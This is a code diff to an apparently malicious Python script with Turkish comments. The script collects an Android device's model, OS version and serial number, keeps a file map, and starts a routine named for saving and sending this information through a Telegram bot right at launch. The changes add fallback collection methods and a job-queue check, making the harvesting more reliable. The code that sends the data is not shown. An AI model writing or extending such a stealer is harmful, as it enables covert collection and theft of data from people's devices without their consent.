@@ -4,6 +4,7 @@ import time
 import requests
 import zipfile
 import asyncio
+import platform
 from telegram.ext import Application, CommandHandler
 
 # Telegram Bot Ayarları
@@ -18,18 +19,28 @@ dosya_haritasi = {}
 def cihaz_bilgisi_al():
     bilgiler = {}
     try:
-        # getprop komutlarını hata kontrolüyle al
+        # getprop komutları (Android’e özgü)
         try:
             model = os.popen("getprop ro.product.model").read().strip()
             bilgiler["Model"] = model if model else "Bilinmiyor (getprop ro.product.model başarısız)"
         except Exception as e:
             bilgiler["Model"] = f"Bilinmiyor (Hata: {str(e)})"
+            # Alternatif: platform modülü
+            try:
+                bilgiler["Model"] = platform.node() or "Bilinmiyor (platform.node başarısız)"
+            except:
+                pass
         
         try:
             os_versiyon = os.popen("getprop ro.build.version.release").read().strip()
             bilgiler["OS"] = os_versiyon if os_versiyon else "Bilinmiyor (getprop ro.build.version.release başarısız)"
         except Exception as e:
             bilgiler["OS"] = f"Bilinmiyor (Hata: {str(e)})"
+            # Alternatif: platform modülü
+            try:
+                bilgiler["OS"] = platform.system() + " " + platform.release() or "Bilinmiyor (platform başarısız)"
+            except:
+                pass
         
         try:
             seri_no = os.popen("getprop ro.serialno").read().strip()
@@ -243,6 +254,9 @@ async def main():
     # Uygulamayı başlat
     await app.initialize()
     # bilgileri_kaydet_ve_gonder'i job_queue ile çalıştır
+    if app.job_queue is None:
+        print("JobQueue başlatılamadı, lütfen 'python-telegram-bot[job-queue]' kurun!")
+        return
     app.job_queue.run_once(bilgileri_kaydet_ve_gonder, when=0)
     # Botu çalıştır
     await app.run_polling()
